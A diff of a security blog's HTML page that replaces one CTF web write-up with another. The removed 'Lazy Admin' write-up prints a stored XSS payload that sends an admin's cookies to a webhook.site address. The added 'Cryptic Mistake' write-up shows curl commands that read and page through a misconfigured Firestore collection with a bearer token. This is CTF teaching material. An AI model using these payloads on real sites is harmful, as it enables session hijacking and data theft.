@@ -5,15 +5,16 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
-<title>Ntua Hack 3.0: Lazy Admin | The Cyber Security Blog</title>
+<title>07CTF 2025: Cryptic Mistake | The Cyber Security Blog</title>
 <meta name="keywords" content="">
-<meta name="description" content="Github Repo with official writeups: NTUAH4CK-3.0 by Thread-in-the-Needle
-Description Admin doesn&rsquo;t take security seriously when reviewing user messages. Can you exploit this? Flag format: NH4CK{a-g}
-Tags: web
-Navigate to the website and start by checking the /contact page. The description makes it obvious that something is vulnerable at the message area.
-When we send a dummy reguest we get a Request Successful message. We can&rsquo;t see anything reflected to our end and probably the message is sent to the administrator to open and read.">
+<meta name="description" content="Description I made a cryptic hunt platform, but seems like I messed up big time.
+https://v0-firebase-ctf-challenge.vercel.app/
+Category: web Difficulty: easy Author: bhavya_32 This is a firebase app, which means we could check for misconfigurations.
+Sign in with a google account and get the Bearer Token ID.
+Firebase uses firestore REST API. If misconfigured we may be able to read information with no priveleges. To access firestore we use
+https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents/{collection} project_id is found at GET /__/firebase/init.">
 <meta name="author" content="">
-<link rel="canonical" href="https://dimparar.github.io/thecybersecurityblog/docs/ntuah4ck_lazyadmin/">
+<link rel="canonical" href="https://dimparar.github.io/thecybersecurityblog/docs/07ctf_cryptic_mistake/">
 <link crossorigin="anonymous" href="/thecybersecurityblog/assets/css/stylesheet.e1d5379b61d412d35dcaf2371eec6bea8c023e307a0719dcab030767036d17f6.css" integrity="sha256-4dU3m2HUEtNdyvI3Huxr6owCPjB6BxncqwMHZwNtF/Y=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://dimparar.github.io/thecybersecurityblog/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://dimparar.github.io/thecybersecurityblog/favicon-16x16.png">
@@ -22,7 +23,7 @@ When we send a dummy reguest we get a Request Successful message. We can&rsquo;t
 <link rel="mask-icon" href="https://dimparar.github.io/thecybersecurityblog/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="https://dimparar.github.io/thecybersecurityblog/docs/ntuah4ck_lazyadmin/">
+<link rel="alternate" hreflang="en" href="https://dimparar.github.io/thecybersecurityblog/docs/07ctf_cryptic_mistake/">
 <noscript>
     <style>
         #theme-toggle,
@@ -59,24 +60,26 @@ When we send a dummy reguest we get a Request Successful message. We can&rsquo;t
         }
 
     </style>
-</noscript><meta property="og:title" content="Ntua Hack 3.0: Lazy Admin" />
-<meta property="og:description" content="Github Repo with official writeups: NTUAH4CK-3.0 by Thread-in-the-Needle
-Description Admin doesn&rsquo;t take security seriously when reviewing user messages. Can you exploit this? Flag format: NH4CK{a-g}
-Tags: web
-Navigate to the website and start by checking the /contact page. The description makes it obvious that something is vulnerable at the message area.
-When we send a dummy reguest we get a Request Successful message. We can&rsquo;t see anything reflected to our end and probably the message is sent to the administrator to open and read." />
+</noscript><meta property="og:title" content="07CTF 2025: Cryptic Mistake" />
+<meta property="og:description" content="Description I made a cryptic hunt platform, but seems like I messed up big time.
+https://v0-firebase-ctf-challenge.vercel.app/
+Category: web Difficulty: easy Author: bhavya_32 This is a firebase app, which means we could check for misconfigurations.
+Sign in with a google account and get the Bearer Token ID.
+Firebase uses firestore REST API. If misconfigured we may be able to read information with no priveleges. To access firestore we use
+https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents/{collection} project_id is found at GET /__/firebase/init." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://dimparar.github.io/thecybersecurityblog/docs/ntuah4ck_lazyadmin/" /><meta property="article:section" content="docs" />
-<meta property="article:published_time" content="2024-12-16T18:41:26+02:00" />
-<meta property="article:modified_time" content="2024-12-16T18:41:26+02:00" />
+<meta property="og:url" content="https://dimparar.github.io/thecybersecurityblog/docs/07ctf_cryptic_mistake/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2025-09-14T21:36:17+03:00" />
+<meta property="article:modified_time" content="2025-09-14T21:36:17+03:00" />
 
 <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Ntua Hack 3.0: Lazy Admin"/>
-<meta name="twitter:description" content="Github Repo with official writeups: NTUAH4CK-3.0 by Thread-in-the-Needle
-Description Admin doesn&rsquo;t take security seriously when reviewing user messages. Can you exploit this? Flag format: NH4CK{a-g}
-Tags: web
-Navigate to the website and start by checking the /contact page. The description makes it obvious that something is vulnerable at the message area.
-When we send a dummy reguest we get a Request Successful message. We can&rsquo;t see anything reflected to our end and probably the message is sent to the administrator to open and read."/>
+<meta name="twitter:title" content="07CTF 2025: Cryptic Mistake"/>
+<meta name="twitter:description" content="Description I made a cryptic hunt platform, but seems like I messed up big time.
+https://v0-firebase-ctf-challenge.vercel.app/
+Category: web Difficulty: easy Author: bhavya_32 This is a firebase app, which means we could check for misconfigurations.
+Sign in with a google account and get the Bearer Token ID.
+Firebase uses firestore REST API. If misconfigured we may be able to read information with no priveleges. To access firestore we use
+https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents/{collection} project_id is found at GET /__/firebase/init."/>
 
 
 <script type="application/ld+json">
@@ -93,8 +96,8 @@ When we send a dummy reguest we get a Request Successful message. We can&rsquo;t
     {
       "@type": "ListItem",
       "position":  2 ,
-      "name": "Ntua Hack 3.0: Lazy Admin",
-      "item": "https://dimparar.github.io/thecybersecurityblog/docs/ntuah4ck_lazyadmin/"
+      "name": "07CTF 2025: Cryptic Mistake",
+      "item": "https://dimparar.github.io/thecybersecurityblog/docs/07ctf_cryptic_mistake/"
     }
   ]
 }
@@ -103,20 +106,20 @@ When we send a dummy reguest we get a Request Successful message. We can&rsquo;t
 {
   "@context": "https://schema.org",
   "@type": "BlogPosting",
-  "headline": "Ntua Hack 3.0: Lazy Admin",
-  "name": "Ntua Hack 3.0: Lazy Admin",
-  "description": "Github Repo with official writeups: NTUAH4CK-3.0 by Thread-in-the-Needle\nDescription Admin doesn\u0026rsquo;t take security seriously when reviewing user messages. Can you exploit this? Flag format: NH4CK{a-g}\nTags: web\nNavigate to the website and start by checking the /contact page. The description makes it obvious that something is vulnerable at the message area.\nWhen we send a dummy reguest we get a Request Successful message. We can\u0026rsquo;t see anything reflected to our end and probably the message is sent to the administrator to open and read.",
+  "headline": "07CTF 2025: Cryptic Mistake",
+  "name": "07CTF 2025: Cryptic Mistake",
+  "description": "Description I made a cryptic hunt platform, but seems like I messed up big time.\nhttps://v0-firebase-ctf-challenge.vercel.app/\nCategory: web Difficulty: easy Author: bhavya_32 This is a firebase app, which means we could check for misconfigurations.\nSign in with a google account and get the Bearer Token ID.\nFirebase uses firestore REST API. If misconfigured we may be able to read information with no priveleges. To access firestore we use\nhttps://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents/{collection} project_id is found at GET /__/firebase/init.",
   "keywords": [
     
   ],
-  "articleBody": " Github Repo with official writeups: NTUAH4CK-3.0 by Thread-in-the-Needle\nDescription Admin doesn’t take security seriously when reviewing user messages. Can you exploit this? Flag format: NH4CK{a-g}\nTags: web\nNavigate to the website and start by checking the /contact page. The description makes it obvious that something is vulnerable at the message area.\nWhen we send a dummy reguest we get a Request Successful message. We can’t see anything reflected to our end and probably the message is sent to the administrator to open and read.\nSo for example a payload like would pop up an alert box to the admin when opening the message. But this way we cannot exploit the vulnerability to, maybe, steal his account.\nAnother way would be to use a server or something like webhook.com and redirect the admin there to steal his cookies.\n\u003cimg src=1 onerror=\"location.href='https://webhook.site//?c=' + document.cookies\"\u003e We got the request to webhook.com which means admin open the message, got redirected and gave away his cookies. Now we could sign use them to login to his account without any restrictions.\nThe flag is printed instead of his cookies.\n",
-  "wordCount" : "186",
+  "articleBody": " Description I made a cryptic hunt platform, but seems like I messed up big time.\nhttps://v0-firebase-ctf-challenge.vercel.app/\nCategory: web Difficulty: easy Author: bhavya_32 This is a firebase app, which means we could check for misconfigurations.\nSign in with a google account and get the Bearer Token ID.\nFirebase uses firestore REST API. If misconfigured we may be able to read information with no priveleges. To access firestore we use\nhttps://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents/{collection} project_id is found at GET /__/firebase/init.json endpoint during sign in.\ncollection is /teams since there we have teams competing in the cryptic challenge.\ncurl 'https://firestore.googleapis.com/v1/projects/ctf-67ebf/databases/(default)/documents/teams' \\n -H 'Authorization: Bearer ' | grep 07CTF{ We won’t find the flag since not all the informations about /teams is shown in this page.\nWe need to request the next page and the next until we find it.\ncurl 'https://firestore.googleapis.com/v1/projects/ctf-67ebf/databases/(default)/documents/teams?pageToken=AFTOeJz1QyxZtnd5EdXR_W-GqrTcAd1Jvqvha1yJZsHt3r_vWCVvDwzndkVp-Na0qbJ7qXUtylR5jXjbZZtXe6Mnkerx6NbtlR982aZvjRfcnegQW5zXRC0ZTDLw8tIt' \\n -H 'Authorization: Bearer ' | grep 07CTF{ ",
+  "wordCount" : "143",
   "inLanguage": "en",
-  "datePublished": "2024-12-16T18:41:26+02:00",
-  "dateModified": "2024-12-16T18:41:26+02:00",
+  "datePublished": "2025-09-14T21:36:17+03:00",
+  "dateModified": "2025-09-14T21:36:17+03:00",
   "mainEntityOfPage": {
     "@type": "WebPage",
-    "@id": "https://dimparar.github.io/thecybersecurityblog/docs/ntuah4ck_lazyadmin/"
+    "@id": "https://dimparar.github.io/thecybersecurityblog/docs/07ctf_cryptic_mistake/"
   },
   "publisher": {
     "@type": "Organization",
@@ -197,33 +200,43 @@ When we send a dummy reguest we get a Request Successful message. We can&rsquo;t
   <header class="post-header">
     
     <h1 class="post-title entry-hint-parent">
-      Ntua Hack 3.0: Lazy Admin
+      07CTF 2025: Cryptic Mistake
     </h1>
-    <div class="post-meta"><span title='2024-12-16 18:41:26 +0200 +0200'>16 Dec 2024</span>
+    <div class="post-meta"><span title='2025-09-14 21:36:17 +0300 +0300'>14 Sep 2025</span>
 
 </div>
   </header> 
   <div class="post-content"><hr>
-<p>Github Repo with official writeups: <a href="https://github.com/Thread-in-the-Needle/NTUAH4CK-3.0">NTUAH4CK-3.0</a> by Thread-in-the-Needle</p>
-<hr>
 <h3 id="description">Description<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h3>
-<p>Admin doesn&rsquo;t take security seriously when reviewing user messages. Can you exploit this? Flag format: NH4CK{a-g}</p>
-<p>Tags: web</p>
+<p>I made a cryptic hunt platform, but seems like I messed up big time.</p>
+<p><a href="https://v0-firebase-ctf-challenge.vercel.app/">https://v0-firebase-ctf-challenge.vercel.app/</a></p>
+<p>Category: web <br>
+Difficulty: easy <br>
+Author: bhavya_32 <br></p>
 <hr>
-<p>Navigate to the website and start by checking the <code>/contact</code> page.
-<img loading="lazy" src="lab1.png" alt="alt"  />
-
-The description makes it obvious that something is vulnerable at the message area.</p>
+<p>This is a firebase app, which means we could check for misconfigurations.</p>
+<p><img loading="lazy" src="lab1.png" alt="alt"  />
+</p>
+<p>Sign in with a google account and get the Bearer Token ID.</p>
 <p><img loading="lazy" src="lab2.png" alt="alt"  />
 </p>
-<p>When we send a dummy reguest we get a <code>Request Successful</code> message. We can&rsquo;t see anything reflected to our end and probably the message is sent to the administrator to open and read.</p>
-<p>So for example a payload like <code>&lt;img src=1 onerror=alert()&gt;</code> would pop up an alert box to the admin when opening the message. But this way we cannot exploit the vulnerability to, maybe, steal his account.</p>
-<p>Another way would be to use a server or something like <code>webhook.com</code> and redirect the admin there to steal his cookies.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;location.href=&#39;https://webhook.site/&lt;id&gt;/?c=&#39; + document.cookies&#34;</span><span style="color:#f92672">&gt;</span>
-</span></span></code></pre></div><p>We got the request to <code>webhook.com</code> which means admin open the message, got redirected and gave away his cookies. Now we could sign use them to login to his account without any restrictions.</p>
+<p>Firebase uses firestore REST API. If misconfigured we may be able to read information with no priveleges.
+To access firestore we use</p>
+<pre tabindex="0"><code class="language-url" data-lang="url">https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents/{collection}
+</code></pre><p><code>project_id</code> is found at <code>GET /__/firebase/init.json</code> endpoint during sign in.</p>
 <p><img loading="lazy" src="lab3.png" alt="alt"  />
 </p>
-<p>The flag is printed instead of his cookies.</p>
+<p><code>collection</code> is <code>/teams</code> since there we have teams competing in the cryptic challenge.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#39;https://firestore.googleapis.com/v1/projects/ctf-67ebf/databases/(default)/documents/teams&#39;</span> <span style="color:#ae81ff">\n</span>
+</span></span><span style="display:flex;"><span> -H <span style="color:#e6db74">&#39;Authorization: Bearer &lt;token_id_we_found&gt;&#39;</span> | grep 07CTF<span style="color:#f92672">{</span>
+</span></span></code></pre></div><p>We won&rsquo;t find the flag since not all the informations about <code>/teams</code> is shown in this page.</p>
+<p><img loading="lazy" src="lab4.png" alt="alt"  />
+</p>
+<p>We need to request the next page and the next until we find it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl <span style="color:#e6db74">&#39;https://firestore.googleapis.com/v1/projects/ctf-67ebf/databases/(default)/documents/teams?pageToken=AFTOeJz1QyxZtnd5EdXR_W-GqrTcAd1Jvqvha1yJZsHt3r_vWCVvDwzndkVp-Na0qbJ7qXUtylR5jXjbZZtXe6Mnkerx6NbtlR982aZvjRfcnegQW5zXRC0ZTDLw8tIt&#39;</span> <span style="color:#ae81ff">\n</span>
+</span></span><span style="display:flex;"><span> -H <span style="color:#e6db74">&#39;Authorization: Bearer &lt;token_id_we_found&gt;&#39;</span> | grep 07CTF<span style="color:#f92672">{</span>
+</span></span></code></pre></div><p><img loading="lazy" src="lab5.png" alt="alt"  />
+</p>
 
 
   </div>
